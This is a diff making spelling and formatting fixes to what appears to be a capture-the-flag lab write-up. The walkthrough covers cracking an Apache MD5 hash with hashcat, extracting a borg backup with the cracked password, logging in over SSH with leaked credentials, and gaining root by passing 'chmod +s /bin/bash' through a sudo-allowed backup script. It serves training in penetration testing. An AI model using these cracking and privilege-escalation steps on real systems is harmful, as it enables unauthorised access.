@@ -34,7 +34,7 @@ Nmap done at Sat Oct 22 19:02:18 2022 -- 1 IP address (1 host up) scanned in 21.
 ```
 # Exploitation
 
->So we will have to get into the target machine ussing ssh, since there is no other way.
+>So we will have to get into the target machine using ssh, since there is no other way.
 {: .prompt-tip}
 
 If we go to the page:
@@ -77,7 +77,7 @@ If we click on download, we get a file called archive.tar, which we can unzip us
 ```shell
 tar -xvf archive.tar
 ```
-Now lets head to the /etc directorie inside the web page, from where we get:
+Now lets head to the /etc directory inside the web page, from where we get:
 
 ```shell
 music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
@@ -92,7 +92,7 @@ First of all, lets try to unhash the password for music_archive. To do this, let
 Hash: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
   [+] MD5(APR)
 ```
-Now we know its type, we can unhash it using hashcat:
+Now that we know its type, we can unhash it using hashcat:
 
 ```shell
 hashcat --force -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
@@ -109,14 +109,14 @@ borg extract /path/to/repo::music_archive
 ```
 We will be asked a password. Type in the one we got before: squidward 
 
-Now we got a /home folder downloaded into te repository, from were we can extract this from the Documents directory:
+Now we got a /home folder downloaded into the repository, from where we can extract this from the Documents directory:
 
 ```shell
 Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
 
 alex:S3cretP@s3
 ```
->Now we can use this password for the ssh service: alex@{VICTIM_IP}
+>Now we can use the password for the ssh service: alex@{VICTIM_IP}
 {: .prompt-tip}
 
 >If we cat the "user.txt", we can get the user flag
@@ -129,7 +129,7 @@ sudo -l
 ```
 From where we get the following output:
 
-```ruby
+```bash
 alex@ubuntu:~$ sudo -l
 Matching Defaults entries for alex on ubuntu:
     env_reset, mail_badpass,
@@ -199,7 +199,7 @@ do
         esac
 done
 ```
-From here we can understand that the command "c" will be executed. It means we can pass it a bash command to become root,so lets do it:
+From here we can understand that the parameter "c" will be executed. It means we can pass it as a bash command to become root, so lets do it:
 
 ```shell
 sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
